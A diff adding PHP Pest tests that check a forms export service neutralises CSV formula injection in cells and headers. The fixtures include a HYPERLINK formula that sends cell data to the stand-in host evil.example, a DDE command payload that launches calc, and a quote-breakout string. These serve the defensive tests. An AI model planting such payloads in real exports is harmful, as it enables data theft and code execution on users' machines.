@@ -256,4 +256,129 @@ afterEach( function (): void {
         removeAllFilters( 'ap.forms.exportHeaders' );
         removeAllFilters( 'ap.forms.exportData' );
     }
-});
+} );
+
+describe( 'CSV formula neutralisation (issue #150)', function (): void {
+    it( 'prefixes a cell starting with a formula character', function ( string $cell ): void {
+        expect( $this->service->neutraliseFormula( $cell ) )->toBe( "'" . $cell );
+    } )->with( [
+        'equals'           => '=HYPERLINK("http://evil.example/?"&A1,"Click")',
+        'plus'             => '+SUM(A1:A2)',
+        'minus'            => '-2+3',
+        'at'               => '@SUM(A1)',
+        'tab'              => "\t=1+1",
+        'carriage return'  => "\r=1+1",
+        'minus then text'  => '-cmd',
+        'number, newline'  => "-5\n",
+        'line feed'        => "\n=1+1",
+        'full-width ＝'    => '＝1+1',
+        'full-width ＋'    => '＋SUM(A1:A2)',
+        'full-width －'    => '－2+3',
+        'full-width ＠'    => '＠SUM(A1)',
+    ] );
+
+    it( 'leaves ordinary values, plain numbers and E.164 phone numbers alone', function ( mixed $cell ): void {
+        expect( $this->service->neutraliseFormula( $cell ) )->toBe( $cell );
+    } )->with( [
+        'text'           => 'Hello world',
+        'empty'          => '',
+        'email'          => 'jane@example.com',
+        'inner equals'   => 'a=b',
+        'negative int'   => '-5',
+        'negative float' => '-12.50',
+        'negative point' => '-.5',
+        'positive sign'  => '+42',
+        'E.164 phone'    => '+15551234567',
+        'integer'        => 7,
+        'null'           => null,
+    ] );
+
+    it( 'neutralises submitted values in a CSV row, after the export filter', function (): void {
+        $form       = Form::factory()->create();
+        $field      = FormField::factory()->for( $form )->create( ['name' => 'comment', 'label' => 'Comment', 'type' => 'text'] );
+        $submission = FormSubmission::factory()->for( $form )->create( ['page_url' => "=cmd|' /C calc'!A0"] );
+        FormSubmissionValue::factory()->for( $submission, 'submission' )->create( [
+            'field_id'   => $field->id,
+            'field_name' => 'comment',
+            'value'      => '=HYPERLINK("http://evil.example/?"&A1,"Click")',
+        ] );
+
+        addFilter( 'ap.forms.exportData', function ( array $row ): array {
+            $row[] = '@added';
+
+            return $row;
+        } );
+
+        $row = $this->service->buildRow( $form, $submission, $form->fields()->get() );
+
+        expect( $row )->toContain( '\'=HYPERLINK("http://evil.example/?"&A1,"Click")' )
+            ->toContain( "'=cmd|' /C calc'!A0" )
+            ->toContain( "'@added" )
+            ->not->toContain( '=HYPERLINK("http://evil.example/?"&A1,"Click")' );
+    } );
+
+    it( 'neutralises field labels in the CSV headers', function (): void {
+        $form = Form::factory()->create();
+        FormField::factory()->for( $form )->create( ['name' => 'total', 'label' => '=1+1', 'type' => 'text'] );
+
+        expect( $this->service->buildHeaders( $form ) )->toContain( "'=1+1" )
+            ->not->toContain( '=1+1' );
+    } );
+
+    it( 'keeps raw values in the JSON export', function (): void {
+        $form       = Form::factory()->create();
+        $field      = FormField::factory()->for( $form )->create( ['name' => 'comment', 'type' => 'text'] );
+        $submission = FormSubmission::factory()->for( $form )->create();
+        FormSubmissionValue::factory()->for( $submission, 'submission' )->create( [
+            'field_id'   => $field->id,
+            'field_name' => 'comment',
+            'value'      => '=1+1',
+        ] );
+
+        $data = $this->service->exportToJson( $form, $form->submissions()->get() );
+
+        expect( $data[0]['data']['comment'] )->toBe( '=1+1' );
+    } );
+
+    it( 'writes the neutralised cells to the CSV download', function (): void {
+        $form       = Form::factory()->create();
+        $field      = FormField::factory()->for( $form )->create( ['name' => 'comment', 'label' => 'Comment', 'type' => 'text'] );
+        $submission = FormSubmission::factory()->for( $form )->create();
+        FormSubmissionValue::factory()->for( $submission, 'submission' )->create( [
+            'field_id'   => $field->id,
+            'field_name' => 'comment',
+            'value'      => '+SUM(A1:A2)',
+        ] );
+
+        $response = $this->service->exportToCsv( $form, $form->submissions()->get() );
+
+        ob_start();
+        $response->sendContent();
+        $csv = ob_get_clean();
+
+        expect( $csv )->toContain( "'+SUM(A1:A2)" )
+            ->not->toMatch( '/(^|,)"?\+SUM/m' );
+    } );
+
+    it( 'doubles a quote after a backslash, so a value cannot break out into a formula cell', function (): void {
+        $form       = Form::factory()->create();
+        $field      = FormField::factory()->for( $form )->create( ['name' => 'comment', 'label' => 'Comment', 'type' => 'text'] );
+        $submission = FormSubmission::factory()->for( $form )->create();
+        FormSubmissionValue::factory()->for( $submission, 'submission' )->create( [
+            'field_id'   => $field->id,
+            'field_name' => 'comment',
+            'value'      => 'hello\\",=1+1,',
+        ] );
+
+        $response = $this->service->exportToCsv( $form, $form->submissions()->get() );
+
+        ob_start();
+        $response->sendContent();
+        $lines = explode( "\n", trim( ob_get_clean() ) );
+
+        $cells = str_getcsv( $lines[1], escape: '' );
+
+        expect( $cells )->toContain( 'hello\\",=1+1,' )
+            ->not->toContain( '=1+1' );
+    } );
+} );
